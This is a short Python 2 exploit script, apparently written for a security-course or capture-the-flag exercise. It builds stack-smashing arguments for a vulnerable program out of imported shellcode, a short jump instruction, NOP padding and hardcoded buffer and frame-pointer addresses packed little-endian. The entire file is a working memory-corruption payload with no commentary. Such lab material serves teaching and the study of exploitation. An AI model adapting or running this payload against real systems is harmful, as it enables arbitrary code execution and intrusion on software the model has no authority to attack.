from shellcode import shellcode
from struct import pack

ebp = 0xbffef45c
buf = 0x080f3750

jmp_op = '\xeb\x06' + '\x90' * 6
padding = '\x90' * (40 - len(shellcode) - len(jmp_op))

arg1 = shellcode 
arg2 = jmp_op + shellcode + padding + pack("<I", buf) + pack("<I", ebp)
arg3 = shellcode

print arg1, arg2, arg3
